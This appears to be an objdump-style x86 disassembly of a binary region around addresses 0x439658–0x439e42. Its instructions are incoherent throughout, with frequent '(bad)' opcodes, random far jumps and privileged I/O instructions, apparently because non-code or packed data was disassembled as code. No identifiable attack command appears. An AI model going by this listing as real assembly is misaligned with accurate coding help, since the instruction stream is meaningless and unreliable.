  439658:	js     0x43964a
  43965a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43965b:	shl    DWORD PTR [edx+0x49],0x1d
  43965f:	les    ebx,FWORD PTR [esp+edx*2-0x1efc084e]
  439666:	call   0x620f:0xa3394f18
  43966d:	add    BYTE PTR [eax],al
  43966f:	add    BYTE PTR [eax],al
  439671:	add    BYTE PTR [eax-0x61],al
  439674:	imul   edx
  439676:	bound  ebp,QWORD PTR [ecx-0x653e8d16]
  43967c:	jmp    0x43964d
  43967e:	mov    dl,0xa9
  439680:	dec    edx
  439681:	aaa    
  439682:	pop    ebp
  439683:	fs adc ebp,ecx
  439686:	dec    eax
  439687:	cs sti 
  439689:	push   0xe914626f
  43968e:	xchg   ebx,eax
  43968f:	and    eax,0x37937574
  439694:	pop    esp
  439695:	ins    DWORD PTR es:[edi],dx
  439696:	jnp    0x4396a5
  439698:	sub    BYTE PTR [esi+0x72],ah
  43969b:	cs iret 
  43969d:	out    dx,al
  43969e:	rdmsr  
  4396a0:	psubsw mm2,QWORD PTR [ebx-0x4bebf0b]
  4396a7:	in     eax,0xe9
  4396a9:	inc    esi
  4396aa:	push   cs
  4396ab:	mov    dl,BYTE PTR [esi-0x9aa6c6]
  4396b1:	mov    ebx,0xd9d62598
  4396b6:	ss jmp eax
  4396b9:	sub    dl,BYTE PTR [edi+ebx*1-0x66e4eefc]
  4396c0:	jmp    0x3f71b6db
  4396c5:	adc    esi,edx
  4396c7:	fwait
  4396c8:	not    DWORD PTR [eax+0x6aea9c0f]
  4396ce:	(bad)  
  4396cf:	mov    eax,ds:0x5fc9b2f5
  4396d4:	or     eax,0x75
  4396d9:	add    BYTE PTR [eax],al
  4396db:	xchg   ebp,eax
  4396dc:	mov    al,cl
  4396de:	jmp    0xcad14976
  4396e3:	mov    bh,0x97
  4396e5:	cmp    ebx,edi
  4396e7:	aad    0xb6
  4396e9:	(bad)  
  4396eb:	mov    ebx,0x29000fde
  4396f0:	mov    dh,0x6b
  4396f2:	jecxz  0x439746
  4396f4:	adc    BYTE PTR [esi],al
  4396f6:	idiv   dl
  4396f8:	jbe    0x439757
  4396fa:	sub    al,0xc4
  4396fc:	jno    0x4396dc
  4396fe:	call   0x29ace2
  439703:	add    DWORD PTR [edx+ebx*1],eax
  439706:	add    cl,bh
  439708:	xor    BYTE PTR [esi-0xc],dl
  43970b:	jp     0x4396fc
  43970d:	dec    esi
  43970e:	call   0x29ad28
  439713:	shl    bl,cl
  439715:	bound  edx,QWORD PTR [eax]
  439717:	sub    ch,ch
  439719:	jo     0x43971f
  43971b:	inc    esp
  43971c:	imul   esp,edx,0xe2616041
  439722:	call   0x2b5466
  439727:	pop    es
  439728:	pop    edi
  439729:	xchg   ebp,eax
  43972a:	dec    ebp
  43972b:	push   ebp
  43972c:	push   cs
  43972d:	xlat   BYTE PTR ds:[ebx]
  43972e:	cmp    BYTE PTR [esi+0x13],dl
  439731:	cmp    al,0xc0
  439733:	cmp    al,0x12
  439736:	add    BYTE PTR [ecx],bh
  439738:	shr    DWORD PTR [edx-0x164a1290],0x75
  43973f:	add    BYTE PTR [eax],al
  439741:	add    BYTE PTR [eax],al
  439743:	add    BYTE PTR [edx+0x76333f5b],dh
  439749:	pop    ebx
  43974a:	aas    
  43974b:	push   edi
  43974c:	adc    eax,edi
  43974e:	inc    esi
  43974f:	inc    ebx
  439750:	jns    0x4397ac
  439752:	aas    
  439753:	call   FWORD PTR [ebp+eiz*4+0x19]
  439757:	inc    eax
  439758:	imul   ebp,DWORD PTR [esi],0x896f85df
  43975e:	pop    es
  43975f:	push   0xec0c1
  439764:	lahf   
  439765:	adc    edi,esi
  439767:	adc    ebx,DWORD PTR [edx+0x75]
  43976a:	jmp    0xdf07:0xc24b9084
  439771:	jmp    0x7dcfaae5
  439776:	into   
  439777:	(bad)  
  439778:	frstor [eax-0x1f]
  43977b:	pop    edi
  43977c:	or     bl,0x12
  43977f:	pop    ecx
  439780:	(bad)  
  439781:	dec    esp
  439782:	mov    eax,ds:0x7a0c2c84
  439787:	xor    BYTE PTR ds:0x7a5222e6,al
  43978d:	ret    
  43978e:	fwait
  43978f:	out    dx,eax
  439790:	imul   esi,DWORD PTR [ebx],0x37ff5762
  439796:	test   al,0x4e
  439798:	ret    
  439799:	bound  esi,QWORD PTR [esi-0x55]
  43979c:	retf   0x6f25
  43979f:	test   al,dl
  4397a1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4397a2:	call   0x9e1eed31
  4397a7:	test   BYTE PTR [eax],al
  4397a9:	add    BYTE PTR [eax],al
  4397ab:	add    BYTE PTR [eax],al
  4397ad:	mov    esi,0xd2e84023
  4397b2:	jecxz  0x4397fc
  4397b4:	stc    
  4397b5:	or     eax,0x8302c1cb
  4397ba:	retf   
  4397bb:	int    0xe4
  4397bd:	xchg   edx,eax
  4397be:	pushf  
  4397bf:	dec    esi
  4397c0:	pop    edx
  4397c1:	fxch   st(3)
  4397c3:	mov    al,ds:0x720bb484
  4397c8:	clc    
  4397c9:	adc    edi,eax
  4397cb:	popf   
  4397cc:	std    
  4397cd:	xchg   edi,eax
  4397ce:	mov    bh,ah
  4397d0:	jne    0x4397ef
  4397d2:	pop    esi
  4397d3:	xor    ah,BYTE PTR [eax]
  4397d5:	jmp    0x7f9a398b
  4397da:	mov    ecx,0x7dac4498
  4397df:	cld    
  4397e0:	jbe    0x4397ff
  4397e2:	xor    ch,BYTE PTR ds:[ecx+ecx*8]
  4397e6:	adc    dl,BYTE PTR [edx]
  4397e8:	and    al,0x68
  4397ea:	mov    bl,0x36
  4397ec:	mov    ebp,0xd07ba058
  4397f1:	jae    0x4397dd
  4397f3:	iret   
  4397f4:	je     0x43983f
  4397f6:	mov    al,ds:0x275088d9
  4397fb:	jae    0x4376ead
  439801:	sbb    esi,edi
  439803:	sbb    ecx,esp
  439805:	push   cs
  439806:	not    DWORD PTR [ebx]
  439808:	or     al,0xb
  43980a:	mov    bh,0xdb
  43980c:	nop
  43980d:	mov    esp,0x90bfd6
  439812:	add    BYTE PTR [eax],al
  439814:	add    BYTE PTR [eax],al
  439816:	pop    esp
  439817:	(bad)  
  439818:	sti    
  439819:	inc    esi
  43981a:	dec    esp
  43981b:	(bad)  
  43981c:	retf   
  43981d:	or     BYTE PTR [eax+0x4c8cf7b2],dl
  439823:	(bad)  
  439824:	mov    DWORD PTR [esi+0x54],0x9004cbd6
  43982b:	mov    dl,0xf7
  43982d:	inc    esi
  43982e:	push   esp
  43982f:	(bad)  
  439830:	lar    edx,WORD PTR [eax-0x7194084e]
  439837:	outs   dx,BYTE PTR ds:[esi]
  439838:	inc    ecx
  439839:	pop    edi
  43983a:	or     eax,0x6342bb96
  43983f:	sub    eax,DWORD PTR [ebp+eax*4-0x5c]
  439843:	stos   BYTE PTR es:[edi],al
  439844:	cmc    
  439845:	add    edx,DWORD PTR [eax-0x54a38cd3]
  43984b:	lahf   
  43984c:	cmp    DWORD PTR [ebp+eiz*2-0x61],ebp
  439850:	xor    DWORD PTR [edi+0xc],ebx
  439853:	jae    0x4397d9
  439855:	or     bl,BYTE PTR [ebx]
  439857:	sub    eax,0x9f896100
  43985c:	adc    dh,bl
  43985e:	iret   
  43985f:	popf   
  439860:	adc    DWORD PTR [ebp+0x35],ecx
  439863:	xor    ebx,DWORD PTR [eax+eax*1]
  439866:	fld    QWORD PTR ds:0xd360620f
  43986c:	cmp    dl,BYTE PTR [edi+0x1533260a]
  439872:	pop    ds
  439873:	adc    DWORD PTR ss:[edx-0x14],esi
  439877:	sub    ebx,DWORD PTR [ebx+0xd]
  43987a:	add    BYTE PTR [eax],al
  43987c:	add    BYTE PTR [eax],al
  43987e:	add    BYTE PTR [eax+esi*8],bh
  439881:	inc    ebx
  439882:	inc    ebx
  439883:	fistp  WORD PTR [eax]
  439885:	rcpps  xmm1,XMMWORD PTR [ebp+0x1ca39604]
  43988c:	push   ds
  43988d:	xor    edi,ecx
  43988f:	mov    BYTE PTR [edx],0x3f
  439892:	shr    DWORD PTR fs:[ecx-0x4d6c686d],cl
  439899:	push   cs
  43989a:	jb     0x439831
  43989c:	sub    ebx,DWORD PTR [ebx-0x33]
  43989f:	(bad)  
  4398a0:	out    dx,eax
  4398a1:	jbe    0x43985c
  4398a3:	xor    eax,0xd8860ef2
  4398a8:	mov    dh,0x40
  4398aa:	jle    0x4398cf
  4398ac:	xlat   BYTE PTR ds:[ebx]
  4398ad:	xchg   ebx,eax
  4398ae:	test   eax,0xe9bc3396
  4398b3:	xchg   ebx,eax
  4398b4:	mov    dl,0x95
  4398b6:	lods   eax,DWORD PTR ds:[esi]
  4398b7:	scas   eax,DWORD PTR es:[edi]
  4398b8:	(bad)  
  4398b9:	fwait
  4398ba:	mov    ch,0x77
  4398bc:	rcl    BYTE PTR [ebp+0x2f1501e1],cl
  4398c2:	ret    
  4398c3:	mov    edi,0x4758e9ee
  4398c8:	mov    dl,0xe
  4398ca:	jmp    0x6c5e0ae7
  4398cf:	sbb    BYTE PTR [edx-0x98b16f2],dh
  4398d5:	xor    al,BYTE PTR ds:0xc932f675
  4398db:	gs push cs
  4398dd:	xchg   esi,eax
  4398de:	popf   
  4398df:	scas   eax,DWORD PTR es:[edi]
  4398e0:	mov    esi,0xfc1d
  4398e5:	add    BYTE PTR [eax],al
  4398e7:	add    BYTE PTR [ecx],cl
  4398e9:	div    DWORD PTR [edx]
  4398eb:	add    BYTE PTR [ebp+0x29],al
  4398ee:	imul   ebp,DWORD PTR [eax],0x4d
  4398f1:	sub    ebp,eax
  4398f3:	je     0x439926
  4398f5:	mov    WORD PTR [edx],gs
  4398f7:	push   edi
  4398f8:	outs   dx,BYTE PTR ds:[esi]
  4398f9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4398fa:	xchg   BYTE PTR [ebx],dl
  4398fc:	test   eax,0xe5c08db6
  439901:	mov    ebx,0xffd30070
  439906:	xchg   ebx,eax
  439907:	xlat   BYTE PTR ds:[ebx]
  439908:	call   0xe7fd:0xd480f6e9
  43990f:	mov    edx,DWORD PTR [ecx+0x36]
  439912:	call   0x5b6f318b
  439917:	and    al,0x2d
  439919:	mov    edi,fs
  43991b:	mov    edx,esi
  43991d:	push   cs
  43991e:	pop    eax
  43991f:	push   edx
  439920:	sub    al,0x0
  439922:	xchg   ebx,eax
  439923:	shl    BYTE PTR [ebp-0x2ab36c5a],0xbd
  43992a:	jo     0x43992d
  43992c:	push   ebx
  43992d:	bound  ebp,QWORD PTR [ebp+0x2409f940]
  439933:	push   edx
  439934:	pop    esp
  439935:	call   DWORD PTR [ebx+0x369111cf]
  43993b:	jmp    FWORD PTR [esi+0x74]
  43993e:	imul   eax,ebp,0xfffffff9
  439941:	mov    edx,0x80992462
  439946:	mov    WORD PTR [ebx-0x74e12a1b],cs
  43994c:	add    BYTE PTR [eax],al
  43994e:	add    BYTE PTR [eax],al
  439950:	add    ch,bl
  439952:	aad    0x22
  439954:	mov    ebp,ebp
  439956:	aad    0x6
  439958:	mov    esi,DWORD PTR [esi-0x76dba4d4]
  43995e:	popa   
  43995f:	aas    
  439960:	(bad)  
  439961:	fxch   st(1)
  439963:	xchg   ebx,eax
  439964:	inc    esp
  439965:	push   ebp
  439966:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  439967:	pop    edx
  439968:	mov    edx,DWORD PTR [eax-0x77b0b46d]
  43996e:	adc    BYTE PTR [ecx],dl
  439970:	push   ebx
  439971:	fidiv  WORD PTR [edx+eiz*4-0x5e6ae4ed]
  439978:	gs xchg ecx,eax
  43997a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43997b:	ret    0x7823
  43997e:	inc    ebp
  43997f:	dec    ebx
  439980:	push   eax
  439981:	mov    esp,0x14094e0e
  439986:	lahf   
  439987:	dec    ebx
  439988:	stc    
  439989:	inc    edi
  43998a:	test   dl,al
  43998c:	and    esp,DWORD PTR [eax+0x37521410]
  439992:	mov    ebx,0xb7ac84aa
  439997:	or     al,BYTE PTR [ebp-0xb4372]
  43999d:	lds    ecx,FWORD PTR [esi+ebx*4+0xb]
  4399a1:	or     eax,0xc961c14b
  4399a6:	aam    0x1a
  4399a8:	jp     0x439a1b
  4399aa:	adc    BYTE PTR [edi],cl
  4399ac:	mov    ecx,DWORD PTR [edi+esi*2-0x22]
  4399b0:	dec    esi
  4399b1:	pop    edi
  4399b2:	xor    al,0xc3
  4399b4:	add    eax,DWORD PTR [eax]
  4399b6:	add    BYTE PTR [eax],al
  4399b8:	add    BYTE PTR [eax],al
  4399ba:	inc    ebx
  4399bb:	sbb    al,0x9e
  4399bd:	aas    
  4399be:	or     eax,0xb49c14b
  4399c3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4399c4:	xor    bl,BYTE PTR [eax]
  4399c6:	or     ecx,DWORD PTR [eax-0x448bb367]
  4399cc:	popf   
  4399cd:	gs nop
  4399cf:	add    al,0xc3
  4399d1:	add    esp,DWORD PTR [ebx-0x14]
  4399d4:	popf   
  4399d5:	pop    ss
  4399d6:	or     eax,0xaf1ac0cb
  4399db:	data16 xor bh,BYTE PTR [ebx+ebx*1]
  4399df:	mov    eax,0x669f52a2
  4399e4:	xor    bh,BYTE PTR [ebx+ecx*1]
  4399e7:	mov    dl,0x21
  4399e9:	imul   ebx,DWORD PTR [ebx],0xffffff9d
  4399ec:	or     DWORD PTR [ebp+ecx*1-0x9],ebx
  4399f0:	fist   DWORD PTR [ebx]
  4399f2:	loopne 0x439a1b
  4399f4:	lock pop esp
  4399f6:	(bad)  
  4399f7:	stos   BYTE PTR es:[edi],al
  4399f8:	pop    esp
  4399f9:	add    cl,al
  4399fb:	fwait
  4399fc:	fs daa 
  4399fe:	jl     0x4399ff
  439a00:	loopne 0x4399b4
  439a02:	shl    DWORD PTR ds:0x9c17d738,cl
  439a08:	dec    esp
  439a09:	and    BYTE PTR [eax+0x48b6f527],ah
  439a0f:	add    esi,DWORD PTR [eax]
  439a11:	mov    ebx,0x871cfdd9
  439a16:	dec    esp
  439a17:	mov    edi,0x72ff4b5
  439a1c:	pop    ebp
  439a1d:	push   0x0
  439a22:	add    BYTE PTR [edi-0x6ffaaf72],ah
  439a28:	mov    dl,0x5d
  439a2a:	inc    esp
  439a2b:	repnz repnz div DWORD PTR [ecx-0x5d17a6a0]
  439a33:	push   eax
  439a34:	mov    dl,0x8f
  439a36:	sbb    ecx,ebx
  439a38:	popf   
  439a39:	cdq    
  439a3a:	pop    DWORD PTR [eax]
  439a3c:	ss push 0xb
  439a3f:	adc    al,0x47
  439a41:	clc    
  439a42:	add    edx,DWORD PTR [eax+0x16b360df]
  439a48:	push   ds
  439a49:	jl     0x4399da
  439a4b:	mov    al,BYTE PTR [ebx]
  439a4d:	stos   BYTE PTR es:[edi],al
  439a4e:	pop    edx
  439a4f:	pop    edi
  439a50:	scas   al,BYTE PTR es:[edi]
  439a51:	jb     0x439a97
  439a53:	inc    ebx
  439a54:	adc    DWORD PTR [ebp+0x2],ebp
  439a57:	or     ebp,esi
  439a59:	aas    
  439a5a:	mov    ch,0x60
  439a5c:	or     dh,dh
  439a5e:	mov    cl,0xa8
  439a60:	add    al,ah
  439a62:	adc    al,0x25
  439a65:	setns  ch
  439a68:	shl    BYTE PTR [ecx-0x609c6c57],cl
  439a6e:	dec    edi
  439a6f:	push   esp
  439a70:	fwait
  439a71:	bnd jmp 0x439a3e
  439a74:	xchg   edi,eax
  439a75:	jmp    0x9d95:0xea2fdc62
  439a7c:	daa    
  439a7d:	push   esp
  439a7e:	add    eax,0x61942824
  439a83:	retf   0xea99
  439a86:	cdq    
  439a87:	add    BYTE PTR [eax],al
  439a89:	add    BYTE PTR [eax],al
  439a8b:	add    BYTE PTR [eax],cl
  439a8d:	out    dx,eax
  439a8e:	sahf   
  439a8f:	cdq    
  439a90:	mov    edx,0x8172e71f
  439a95:	xor    eax,0x4b50a6da
  439a9a:	push   ebx
  439a9b:	jmp    0x65154d33
  439aa0:	mov    ebx,0x2bc6ea98
  439aa5:	pushf  
  439aa6:	jmp    0xbab6:0xec83bbe9
  439aad:	xor    eax,0x2bb1612
  439ab2:	pop    ss
  439ab3:	jb     0x439a85
  439ab5:	mov    ds:0x999b723f,al
  439aba:	inc    eax
  439abb:	loope  0x439acb
  439abd:	mov    al,0x40
  439abf:	mov    es,WORD PTR [ebx-0x4d]
  439ac2:	test   BYTE PTR [esi+0x60],0x97
  439ac6:	jmp    0x3824:0x95ebe7bd
  439acd:	(bad)
  439ad0:	fwait
  439ad1:	scas   eax,DWORD PTR es:[edi]
  439ad2:	mov    ecx,gs
  439ad4:	xchg   ebx,eax
  439ad5:	mov    dl,0x19
  439ad7:	xchg   esi,eax
  439ad8:	or     DWORD PTR [edx-0x66a5ad95],0x4a
  439adf:	scas   eax,DWORD PTR es:[edi]
  439ae0:	inc    esp
  439ae1:	pop    ebp
  439ae2:	nop
  439ae3:	add    BYTE PTR [ebp+0x2f],al
  439ae6:	in     al,dx
  439ae7:	(bad)  
  439ae8:	mov    ecx,0xfe563d63
  439aed:	sub    eax,0x245b
  439af2:	add    BYTE PTR [eax],al
  439af4:	add    cl,al
  439af6:	cmp    ecx,DWORD PTR [edi]
  439af8:	add    DWORD PTR [ecx-0x4a],edi
  439afb:	pop    ebx
  439afc:	(bad)  
  439afd:	cmc    
  439afe:	mov    ecx,0xb6690082
  439b03:	pop    ecx
  439b04:	(bad)  
  439b05:	fnstsw WORD PTR [ecx-0x4986fc76]
  439b0b:	xchg   ebx,eax
  439b0c:	repnz jmp FWORD PTR [eax]
  439b0f:	or     eax,0x3b89f9ff
  439b14:	(bad)  
  439b15:	in     al,dx
  439b16:	cmc    
  439b17:	bound  eax,QWORD PTR [edx+eax*8]
  439b1a:	or     esi,esp
  439b1c:	adc    edi,DWORD PTR [esi-0x78]
  439b1f:	out    0x8d,eax
  439b21:	mov    ebp,0x290086d2
  439b26:	mov    dh,0x3b
  439b28:	leave  
  439b29:	inc    ecx
  439b2a:	jge    0x439ac7
  439b2c:	std    
  439b2d:	out    0x27,al
  439b2f:	test   DWORD PTR [ebx-0x7b6aa0c9],0xffea228d
  439b39:	stc    
  439b3a:	gs out 0xb4,eax
  439b3d:	int    0x4d
  439b3f:	in     al,dx
  439b40:	(bad)  
  439b41:	jmp    0xfd9582a9
  439b46:	sbb    bh,cl
  439b48:	je     0x439b47
  439b4a:	es enter 0xcaeb,0x62
  439b4f:	je     0x439b50
  439b51:	je     0x439b75
  439b53:	xor    ebx,DWORD PTR [eax+0x330eb5e8]
  439b59:	add    BYTE PTR [eax],al
  439b5b:	add    BYTE PTR [eax],al
  439b5d:	add    BYTE PTR [eax+0x64935606],al
  439b63:	sti    
  439b64:	xchg   ebx,eax
  439b65:	fcom   DWORD PTR [eax-0x6f97eaec]
  439b6b:	mov    cl,BYTE PTR [esi]
  439b6d:	add    BYTE PTR ds:0x92942f08,bl
  439b73:	mov    ecx,DWORD PTR [esi]
  439b75:	push   eax
  439b76:	lahf   
  439b77:	pop    ss
  439b78:	das    
  439b79:	lods   al,BYTE PTR ds:[esi]
  439b7a:	xchg   ebx,eax
  439b7b:	mov    ecx,DWORD PTR [esi]
  439b7d:	push   edx
  439b7e:	(bad)  
  439b7f:	pop    edx
  439b80:	cli    
  439b81:	adc    BYTE PTR [eax+0x3e],0xe3
  439b85:	push   eax
  439b86:	jmp    0x1123:0xac9491c0
  439b8d:	add    BYTE PTR [eax-0x7b17aaa4],dl
  439b93:	cld    
  439b94:	inc    ecx
  439b95:	stc    
  439b96:	or     esp,DWORD PTR [ebx+0x4f050a9b]
  439b9c:	or     dl,BYTE PTR [eax]
  439b9e:	loopne 0x439b30
  439ba0:	call   0xe600:0xe8c2424
  439ba7:	sbb    BYTE PTR [ebp+0x2eb70b0f],0x10
  439bae:	arpl   WORD PTR ds:0x911bc069,di
  439bb4:	pop    ss
  439bb5:	inc    ebx
  439bb6:	dec    edx
  439bb7:	adc    dl,dl
  439bb9:	and    eax,DWORD PTR [eax-0x5bdc2e0a]
  439bbf:	fiadd  DWORD PTR [edi-0x4c]
  439bc2:	add    BYTE PTR [eax],al
  439bc4:	add    BYTE PTR [eax],al
  439bc6:	add    BYTE PTR [ebx+ebp*8-0x266fffee],ch
  439bcd:	inc    edi
  439bce:	push   eax
  439bcf:	mov    al,ds:0x8423d214
  439bd4:	pop    esp
  439bd5:	and    al,0x83
  439bd7:	rol    BYTE PTR [edi-0x30f63a57],1
  439bdd:	cs adc al,0x5
  439be0:	mov    edi,0xb2092c2e
  439be5:	add    dx,WORD PTR [eax+0x62d73fb2]
  439bec:	cdq    
  439bed:	inc    ecx
  439bee:	xchg   BYTE PTR [esi+ecx*8-0x5],bl
  439bf2:	call   0x7b8:0x3f7b206
  439bf9:	sbb    DWORD PTR [eax-0x67],0x2c
  439bfd:	ins    BYTE PTR es:[edi],dx
  439bfe:	pop    ds
  439bff:	call   0x474793b8
  439c04:	xchg   ebx,eax
  439c05:	mov    ds:0x92f87c3,al
  439c0a:	mov    WORD PTR [edi],?
  439c0c:	test   al,0xba
  439c0e:	inc    eax
  439c0f:	loopne 0x439c3c
  439c11:	aaa    
  439c12:	jle    0x439c59
  439c14:	test   al,0xba
  439c16:	inc    esp
  439c17:	in     eax,0x16
  439c19:	aam    0xfb
  439c1b:	pop    edi
  439c1c:	call   0xff4ede8d
  439c21:	rcr    DWORD PTR [edi],cl
  439c23:	cdq    
  439c24:	in     eax,dx
  439c25:	mov    ch,0xb4
  439c27:	dec    eax
  439c28:	pop    ds
  439c29:	adc    al,0xf8
  439c2b:	add    BYTE PTR [eax],al
  439c2d:	add    BYTE PTR [eax],al
  439c2f:	add    BYTE PTR [edx],dl
  439c31:	xchg   cl,dh
  439c33:	ror    BYTE PTR [edx+0x2],0xd9
  439c37:	shl    BYTE PTR [ebx-0x3a],1
  439c3a:	(bad)  
  439c3b:	shl    BYTE PTR [ebx-0x12],0x7
  439c3f:	push   edi
  439c40:	bound  edx,QWORD PTR [edi-0xd7a2c35]
  439c46:	div    DWORD PTR [ebx-0x43c7759f]
  439c4c:	or     bl,BYTE PTR [eax+0x2bb44075]
  439c52:	mov    bl,0x6c
  439c54:	or     ecx,0xffffff98
  439c57:	push   edi
  439c58:	adc    eax,0xaee6806c
  439c5d:	xchg   edi,eax
  439c5e:	imul   ecx,DWORD PTR [ebx+0xe0f8ac9],0xeea99a5
  439c68:	push   es
  439c69:	std    
  439c6a:	inc    ebp
  439c6b:	push   0xe90e3250
  439c70:	xchg   ebx,eax
  439c71:	pop    eax
  439c72:	pop    es
  439c73:	jmp    0xebaf2384
  439c78:	xchg   ebx,eax
  439c79:	mov    dl,0x3d
  439c7b:	pushf  
  439c7c:	cmc    
  439c7d:	add    ah,BYTE PTR [ebp+0xef2fe39]
  439c83:	jo     0x439c11
  439c85:	push   ecx
  439c86:	dec    edi
  439c87:	jmp    0x250f4787
  439c8c:	fild   QWORD PTR ds:0xd35870e7
  439c92:	cs ins BYTE PTR es:[edi],dx
  439c94:	add    BYTE PTR [eax],al
  439c96:	add    BYTE PTR [eax],al
  439c98:	add    bh,bl
  439c9a:	test   eax,0xb2919f92
  439c9f:	push   cs
  439ca0:	jb     0x439c31
  439ca2:	adc    BYTE PTR [eax],dl
  439ca4:	mov    edx,0x604204cd
  439ca9:	inc    eax
  439caa:	shr    DWORD PTR [esi],cl
  439cac:	out    dx,al
  439cad:	add    al,0xd7
  439caf:	xchg   ebx,eax
  439cb0:	test   eax,0xeb33338e
  439cb5:	xchg   ebx,eax
  439cb6:	mov    dl,0x95
  439cb8:	out    dx,al
  439cb9:	or     dh,ah
  439cbb:	xor    ch,ch
  439cbd:	in     al,0xc
  439cbf:	sbb    DWORD PTR [esi],ebx
  439cc1:	mov    edi,0xd3640302
  439cc6:	test   eax,0xb291e693
  439ccb:	push   cs
  439ccc:	bound  ecx,QWORD PTR [edi-0x2d]
  439ccf:	or     dh,BYTE PTR [edi+esi*1-0x2d]
  439cd3:	(bad)  
  439cd4:	jno    0x439c61
  439cd6:	call   0xc3803319
  439cdb:	xchg   ebx,eax
  439cdc:	test   eax,0xf93396
  439ce1:	clc    
  439ce2:	mov    dl,0xe
  439ce4:	xor    ebx,DWORD PTR [esi+0x2c]
  439ce7:	push   ebx
  439ce8:	and    al,0xb9
  439cea:	sub    DWORD PTR [ebx+0x24],eax
  439ced:	loope  0x439d1a
  439cef:	pop    ss
  439cf0:	push   edx
  439cf1:	or     DWORD PTR [eax],eax
  439cf3:	pop    edx
  439cf4:	cmp    BYTE PTR [ebx+esi*8],dh
  439cf7:	pop    ss
  439cf8:	test   DWORD PTR [ecx],ebx
  439cfa:	scas   al,BYTE PTR es:[edi]
  439cfb:	push   cs
  439cfc:	add    BYTE PTR [eax],al
  439cfe:	add    BYTE PTR [eax],al
  439d00:	add    BYTE PTR [eax],al
  439d02:	cmp    BYTE PTR [edx+0x2e],0x18
  439d06:	sahf   
  439d07:	push   ss
  439d08:	lods   eax,DWORD PTR ds:[esi]
  439d09:	add    DWORD PTR [ecx-0x7abb6c4e],ebp
  439d0f:	sahf   
  439d10:	jb     0x439d12
  439d12:	js     0x439cc6
  439d14:	push   cs
  439d15:	mov    eax,DWORD PTR [ecx-0x12db7cd5]
  439d1b:	mov    cl,0xe
  439d1d:	add    BYTE PTR [ebx],bh
  439d1f:	mov    bh,dl
  439d21:	add    eax,DWORD PTR [esp+eiz*4+0x5a]
  439d25:	dec    DWORD PTR [eax]
  439d27:	xchg   BYTE PTR [ebp-0x6c6a1a40],cl
  439d2d:	out    dx,eax
  439d2e:	xchg   edx,eax
  439d2f:	mov    al,ds:0x2e3e6a3f
  439d34:	and    DWORD PTR [ecx+ecx*8],0xffffffae
  439d38:	push   cs
  439d39:	add    BYTE PTR [edx-0x47770917],bl
  439d3f:	std    
  439d40:	out    0x8b,eax
  439d42:	push   ecx
  439d43:	sub    al,0x5b
  439d45:	and    al,0x49
  439d47:	mov    ch,dl
  439d49:	add    BYTE PTR [ecx],ch
  439d4b:	mov    dl,0x93
  439d4d:	adc    DWORD PTR [edx+esi*1-0x4e0773cd],ebp
  439d54:	push   cs
  439d55:	push   eax
  439d56:	mov    eax,ds:0x531ebfe
  439d5b:	popa   
  439d5c:	out    0x52,eax
  439d5e:	nop
  439d5f:	xchg   edi,eax
  439d60:	imul   eax,eax,0xd9978f64
  439d66:	add    BYTE PTR [eax],al
  439d68:	add    BYTE PTR [eax],al
  439d6a:	add    bl,bh
  439d6c:	js     0x439d29
  439d6e:	fild   WORD PTR gs:[esi]
  439d71:	pop    edi
  439d72:	and    al,0x0
  439d74:	mov    ecx,DWORD PTR [esi]
  439d76:	add    BYTE PTR [ebx+0x214f7b52],al
  439d7c:	cmove  eax,DWORD PTR [ebp+0x239f06d8]
  439d83:	dec    eax
  439d84:	inc    edx
  439d85:	arpl   WORD PTR [eax],ax
  439d87:	nop
  439d88:	mov    esi,DWORD PTR [esi-0x13]
  439d8b:	inc    ebx
  439d8c:	in     al,dx
  439d8d:	inc    ebx
  439d8e:	and    DWORD PTR [esi+0x5961dd5f],0xffffff9d
  439d95:	fimul  DWORD PTR [ebx]
  439d97:	dec    ecx
  439d98:	pop    ss
  439d99:	mov    DWORD PTR [eax-0x70],eax
  439d9c:	adc    DWORD PTR [ebx+0x4a],esi
  439d9f:	ror    BYTE PTR [ebx-0x54c5fe89],1
  439da5:	sar    BYTE PTR [edi],1
  439da7:	nop
  439da8:	adc    BYTE PTR [ebp-0x7b],dl
  439dab:	push   edx
  439dac:	push   es
  439dad:	sub    BYTE PTR [ecx],cl
  439daf:	aad    0xc8
  439db1:	mov    ds:0x72065284,al
  439db6:	or     ebp,edx
  439db8:	into   
  439db9:	mov    ds:0x2ec7154e,al
  439dbe:	push   esp
  439dbf:	loopne 0x439d9e
  439dc1:	inc    ebx
  439dc2:	adc    eax,eax
  439dc4:	cdq    
  439dc5:	into   
  439dc6:	(bad)  
  439dc7:	fcomip st,st(6)
  439dc9:	test   eax,0x7abb7823
  439dce:	retf   0x0
  439dd1:	add    BYTE PTR [eax],al
  439dd3:	add    dh,al
  439dd5:	push   esi
  439dd6:	inc    ebx
  439dd7:	jge    0x439e25
  439dd9:	adc    DWORD PTR [edi+0x765b1bcb],0xffffffff
  439de0:	scas   eax,DWORD PTR es:[edi]
  439de1:	mov    dl,0xb0
  439de3:	push   esp
  439de4:	adc    eax,0xb1598069
  439de9:	xchg   ebp,eax
  439dea:	or     DWORD PTR [eax+0x10dfce54],0x549230cf
  439df4:	mov    esi,ebp
  439df6:	mov    dh,0x8a
  439df8:	dec    esp
  439df9:	into   
  439dfa:	mov    edi,0xbb20ceab
  439dff:	xchg   BYTE PTR [esi+ecx*8+0x1b],bl
  439e03:	fwait
  439e04:	daa    
  439e05:	mov    dl,0xf7
  439e07:	add    ebp,DWORD PTR [eax-0x56ab5ae9]
  439e0d:	sub    BYTE PTR [edi+ebx*1+0x1fbc2780],ah
  439e14:	test   BYTE PTR [edx],al
  439e16:	ror    BYTE PTR [ebp-0x6b],0x3a
  439e1a:	(bad)  
  439e1b:	jmp    0x439e9c
  439e1d:	mov    al,0x3e
  439e1f:	icebp  
  439e20:	out    dx,eax
  439e21:	popf   
  439e22:	cmc    
  439e23:	jne    0x439db3
  439e25:	or     bh,bh
  439e27:	call   FWORD PTR [ebx]
  439e29:	ror    DWORD PTR [edi-0x19c392ad],0x86
  439e30:	aam    0xce
  439e32:	shr    DWORD PTR [ebx+0x47],cl
  439e35:	xchg   edi,eax
  439e36:	jmp    0x439e8e
  439e3b:	add    BYTE PTR [eax],al
  439e3d:	or     eax,0xf7fbdbef
  439e42:	scas   al,BYTE PTR es:[edi]
